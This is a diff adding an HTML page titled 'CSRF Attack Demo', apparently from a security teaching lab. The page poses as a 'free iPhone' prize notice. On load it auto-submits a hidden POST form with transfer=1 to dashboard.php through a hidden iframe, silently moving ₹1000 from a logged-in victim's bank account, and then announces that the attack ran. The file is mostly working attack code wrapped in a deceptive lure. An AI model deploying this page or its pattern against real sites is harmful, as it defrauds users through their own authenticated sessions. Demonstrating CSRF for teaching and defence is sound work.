@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack Demo</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background: linear-gradient(135deg, #ff9966 0%, #ff5e62 100%);
+            color: white;
+            margin: 0;
+            height: 100vh;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 1.2rem;
+            margin-bottom: 30px;
+        }
+        .status {
+            background: #ffeaa7;
+            color: #d63031;
+            padding: 15px;
+            border-radius: 8px;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎉 Congratulations! You are our 1,000,000th visitor! 🎉</h1>
+        <p>You have won a free iPhone! Please wait while we process your prize...</p>
+
+        <div class="status" id="statusMessage">
+            Loading your prize... (Executing CSRF Attack in the background)
+        </div>
+
+        <!-- 
+            Intentional CSRF Attack Demo:
+            This hidden form automatically submits a money transfer request to dashboard.php.
+            If the victim is logged into their bank account in the same browser, their browser 
+            will automatically attach their session cookies to this request, silently transferring ₹1000.
+        -->
+        <form id="csrfForm" action="dashboard.php" method="POST" target="hiddenFrame" style="display: none;">
+            <input type="hidden" name="transfer" value="1">
+        </form>
+
+        <!-- Hidden iframe to prevent the page from navigating away when the form submits -->
+        <iframe name="hiddenFrame" style="display:none;"></iframe>
+    </div>
+
+    <script>
+        // Automatically submit the hidden form as soon as the page loads
+        window.onload = function() {
+            document.getElementById('csrfForm').submit();
+            
+            setTimeout(() => {
+                document.getElementById('statusMessage').innerHTML = "✅ CSRF Attack Executed! If you were logged in, ₹1000 was just transferred from your account.<br><br><a href='dashboard.php' style='color:#d63031;'>Check your Bank Dashboard</a>";
+            }, 1000);
+        };
+    </script>
+</body>
+</html>
